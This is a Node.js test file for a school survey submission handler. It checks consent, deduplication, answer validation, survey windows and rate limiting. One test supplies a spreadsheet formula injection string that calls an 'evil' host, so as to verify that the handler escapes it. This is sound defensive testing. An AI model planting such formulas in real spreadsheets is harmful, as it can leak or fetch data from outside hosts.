// Tests for the submit action. Loads Core.js, the generated Engine.js and Instruments.js, and
// Submit.js into one sandbox, the way Apps Script shares a global scope between files.
// Needs `npm run apps-script` in /web first (CI does this).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { randomUUID } from 'node:crypto';
import vm from 'node:vm';

const dir = join(dirname(fileURLToPath(import.meta.url)), '..');
for (const f of ['Engine.js', 'Instruments.js']) {
  if (!existsSync(join(dir, f))) throw new Error(`${f} missing: run "npm run apps-script" in /web first`);
}
const ctx = vm.createContext({ console });
for (const f of ['Core.js', 'Engine.js', 'Instruments.js', 'Submit.js']) vm.runInContext(readFileSync(join(dir, f), 'utf8'), ctx, { filename: f });
const G = ctx;
/** Results come from the sandbox's realm; JSON makes them plain objects for deepEqual. */
const run = (...a) => JSON.parse(JSON.stringify(G.processSubmission(...a)));

function memory() {
  const tabs = Object.fromEntries(Object.keys(G.HEADERS).map((t) => [t, []]));
  tabs.Config = G.DEFAULT_CONFIG.map((r) => ({ ...r }));
  const db = {
    read: (t) => tabs[t].map((r) => ({ ...r })),
    append: (t, o) => tabs[t].push(Object.fromEntries(G.HEADERS[t].map((h) => [h, o[h] ?? '']))),
    update: (t, k, v, p) => { const r = tabs[t].find((x) => String(x[k]) === String(v)); if (!r) return false; Object.assign(r, p); return true; },
  };
  return { tabs, db, sheets: {}, contacts: [], busy: false, rate: true };
}

let clock = new Date('2027-01-15T06:00:00Z');
function deps(m) {
  return {
    findSchoolByToken: (t) => m.db.read('Schools').find((s) => s.school_token === t) ?? null,
    readConfig: () => m.db.read('Config'),
    registry: G.INSTRUMENT_REGISTRY,
    engine: G.BeginnersEngine,
    now: () => clock,
    rateOk: () => m.rate,
    withLock: (fn) => { if (m.busy) throw new Error('busy'); return fn(); },
    ensureTab: (tab, headers) => {
      if (!m.sheets[tab]) m.sheets[tab] = { headers, rows: [] };
      else if (m.sheets[tab].headers.join('|') !== headers.join('|')) throw new Error('Header mismatch');
      return true;
    },
    tabHasSubmission: (tab, id) => !!m.sheets[tab]?.rows.some((r) => r[0] === id),
    appendRow: (tab, cells) => m.sheets[tab].rows.push(cells),
    appendContactRequests: (rows) => m.contacts.push(...rows),
    audit: (event, code, id, detail) => m.tabs.Audit.push({ event, school_code: code, submission_id: id, detail }),
  };
}

function school(m, over = {}) {
  const reg = G.makeRegistry(m.db, { now: () => clock, uuid: randomUUID, actor: 't@example.org', siteUrl: 'https://x/' });
  const r = reg.register({
    name: 'S', udise_code: '', district: 'East Khasi Hills', block_locality: 'L', is_shillong_city: 'No', area_type: 'Urban',
    management: 'Other', classes_offered: ['9', '10', '11', '12'], streams: ['Science'], contact_person: 'C', contact_phone: '0',
    safeguarding_lead_name: 'A', safeguarding_lead_phone: '0', referral_name: 'B', referral_phone: '0', ...over,
  });
  assert.equal(r.ok, true, JSON.stringify(r));
  return m.tabs.Schools.find((s) => s.school_code === r.school.school_code);
}

/** Answers every question with its first substantive option, a short text or a mid number. */
function fill(versionId) {
  const inst = G.INSTRUMENT_REGISTRY[versionId].instrument;
  const answers = {};
  for (const s of inst.sections) for (const q of s.questions) {
    const first = (q.options ?? []).find((o) => o.role === 'VALUE') ?? (q.options ?? [])[0];
    if (q.type === 'single' || q.type === 'multi') { if (first) answers[q.id] = { codes: [first.code] }; else if (q.options_from) answers[q.id] = { codes: [1] }; }
    else if (q.type === 'text') answers[q.id] = { text: 'A short answer' };
    else if (q.type === 'number') { const v = q.validation ?? {}; answers[q.id] = { num: String(Math.round(((v.soft_min ?? v.min ?? 0) + (v.soft_max ?? v.max ?? 10)) / 2)) }; }
    else if (q.type === 'matrix') answers[q.id] = { rows: Object.fromEntries(q.rows.map((r) => [r.variable, q.options[0].code])) };
  }
  return answers;
}

const payload = (s, over = {}) => ({
  action: 'submit', s: s.school_token, submission_id: randomUUID(), instrument_version_id: 'STU_11_12_V1.0', consent: 'yes',
  route_role: 'student', route_class: '11', started_at: '2027-01-15T05:30:00.000Z', finished_at: '2027-01-15T05:55:00.000Z',
  client_app_version: '0.1.0', answers: fill('STU_11_12_V1.0'), ...over,
});

const rowOf = (m, tab, i = 0) => Object.fromEntries(m.sheets[tab].headers.map((h, k) => [h, m.sheets[tab].rows[i][k]]));

test('a complete student response becomes one row with system columns', () => {
  const m = memory(); const s = school(m); const p = payload(s);
  const out = run(p, deps(m));
  assert.deepEqual(out, { ok: true, submission_id: p.submission_id });
  const row = rowOf(m, 'R_STU_11_12_V1.0');
  assert.equal(row.school_code, s.school_code);
  assert.equal(row.respondent_type, 'student');
  assert.equal(row.route_class, '11');
  assert.equal(row.consent, 'yes');
  assert.equal(row.assent, 'yes');
  assert.equal(row.duration_sec, 1500);
  assert.equal(row.received_at, clock.toISOString());
  // DEC-24: the hidden school question is filled from the school record.
  assert.equal(row.school_name, s.school_code);
  // Contact requests go only to the restricted spreadsheet (docs/21 rule 4).
  assert.equal('support_contact_request' in row, false);
  assert.equal('contact_permission' in row, false);
  assert.equal(m.contacts.length, 2);
  assert.equal(m.contacts[0][1], s.school_code);
  assert.equal(m.contacts[0][9], 'NEW');
  // No blank variable cells: every value or a status token.
  const vars = m.sheets['R_STU_11_12_V1.0'].headers.slice(G.SYSTEM_COLUMNS.length).filter((h) => !h.includes('_other_text'));
  for (const v of vars) assert.notEqual(row[v], '', v);
  assert.equal(m.tabs.Audit.at(-1).event, 'submit');
});

test('sending the same response twice stores it once', () => {
  const m = memory(); const s = school(m); const p = payload(s);
  run(p, deps(m));
  const again = run(p, deps(m));
  assert.deepEqual(again, { ok: true, submission_id: p.submission_id, duplicate: true });
  assert.equal(m.sheets['R_STU_11_12_V1.0'].rows.length, 1);
  assert.equal(m.contacts.length, 2);
});

test('refuses malformed requests, inactive schools, other instruments and missing consent', () => {
  const m = memory(); const s = school(m);
  const r = (over) => run(payload(s, over), deps(m));
  assert.deepEqual(r({ s: 'short' }), { ok: false, error: 'bad_request', retry: false });
  assert.deepEqual(r({ submission_id: 'not-a-uuid' }), { ok: false, error: 'bad_request', retry: false });
  assert.deepEqual(r({ consent: 'no' }), { ok: false, error: 'no_consent', retry: false });
  assert.deepEqual(r({ instrument_version_id: 'STU_11_12_V0.9' }), { ok: false, error: 'instrument_not_allowed', retry: false });
  const junior = school(m, { classes_offered: ['7', '8'], streams: [] });
  assert.equal(run(payload(junior), deps(m)).error, 'instrument_not_allowed');
  const reg = G.makeRegistry(m.db, { now: () => clock, uuid: randomUUID, actor: 't', siteUrl: '' });
  reg.setStatus(s.school_code, 'CLOSED');
  assert.deepEqual(r({}), { ok: false, error: 'unavailable', retry: false });
  assert.equal(m.sheets['R_STU_11_12_V1.0'], undefined);
  assert.ok(m.tabs.Audit.some((a) => a.event === 'reject'));
});

test('invalid answers are stored as #INVALID with flags, never dropped (DEC-29)', () => {
  const m = memory(); const s = school(m);
  const answers = fill('STU_11_12_V1.0');
  answers.STU_A02 = { num: 'abc' };           // not a number
  answers.STU_B07 = { codes: [0, 1] };         // "None of these" together with a subject
  delete answers.STU_A03;                      // a required question left empty?
  answers.bogus = { codes: [1] };
  run(payload(s, { answers }), deps(m));
  const row = rowOf(m, 'R_STU_11_12_V1.0');
  assert.equal(row.age_years, '#INVALID');
  assert.equal(row.difficult_subjects, '#INVALID');
  assert.match(row.flags, /INVALID:age_years/);
  assert.match(row.flags, /INVALID:difficult_subjects/);
  assert.match(row.flags, /UNKNOWN_QUESTION:bogus/);
});

test('text that looks like a formula is stored as plain text', () => {
  const m = memory(); const s = school(m);
  const answers = fill('STU_11_12_V1.0');
  const textQ = G.INSTRUMENT_REGISTRY['STU_11_12_V1.0'].instrument.sections.flatMap((x) => x.questions).find((q) => q.type === 'text' && q.id !== 'STU_A05');
  answers[textQ.id] = { text: '=IMPORTXML("http://evil","//a")' };
  run(payload(s, { answers }), deps(m));
  assert.equal(rowOf(m, 'R_STU_11_12_V1.0')[textQ.variable], '\'=IMPORTXML("http://evil","//a")');
});

test('class chosen on the landing page is compared with the instrument class question', () => {
  const m = memory(); const s = school(m);
  run(payload(s, { route_class: '12' }), deps(m)); // instrument answer is code 1 = Class 11
  assert.match(rowOf(m, 'R_STU_11_12_V1.0').flags, /ROUTE_CLASS_MISMATCH/);
  run(payload(s, { route_class: '11' }), deps(m));
  assert.doesNotMatch(rowOf(m, 'R_STU_11_12_V1.0', 1).flags, /ROUTE_CLASS_MISMATCH/);
});

test('survey window: late phones sync within the grace period, new responses after closing are refused', () => {
  const m = memory(); const s = school(m, { survey_closes: '2027-01-15' });
  clock = new Date('2027-01-20T06:00:00Z');
  const late = run(payload(s, { finished_at: '2027-01-15T10:00:00.000Z' }), deps(m));
  assert.equal(late.ok, true);
  assert.match(rowOf(m, 'R_STU_11_12_V1.0').flags, /LATE_SYNC/);
  assert.equal(run(payload(s, { finished_at: '2027-01-17T10:00:00.000Z' }), deps(m)).error, 'closed');
  clock = new Date('2027-02-10T06:00:00Z');
  assert.equal(run(payload(s, { finished_at: '2027-01-15T10:00:00.000Z' }), deps(m)).error, 'closed');
  clock = new Date('2027-01-15T06:00:00Z');
});

test('a busy server or rate limit asks the app to try again later', () => {
  const m = memory(); const s = school(m);
  m.busy = true;
  assert.deepEqual(run(payload(s), deps(m)), { ok: false, error: 'busy', retry: true });
  m.busy = false; m.rate = false;
  assert.deepEqual(run(payload(s), deps(m)), { ok: false, error: 'rate_limited', retry: true });
});

test('every deployed instrument accepts a complete response from its own respondents', () => {
  const m = memory(); const s = school(m, { classes_offered: ['7', '8', '9', '10', '11', '12'] });
  for (const [id, entry] of Object.entries(G.INSTRUMENT_REGISTRY)) {
    const role = entry.instrument.respondent_type;
    const out = run(payload(s, { instrument_version_id: id, route_role: role, route_class: role === 'student' ? String(entry.instrument.class_range[0]) : '', answers: fill(id) }), deps(m));
    assert.equal(out.ok, true, `${id}: ${JSON.stringify(out)}`);
    const row = rowOf(m, `R_${id}`);
    assert.equal(row.instrument_version_id, id);
    assert.doesNotMatch(row.flags, /INVALID|MALFORMED|UNKNOWN/, `${id}: ${row.flags}`);
  }
});
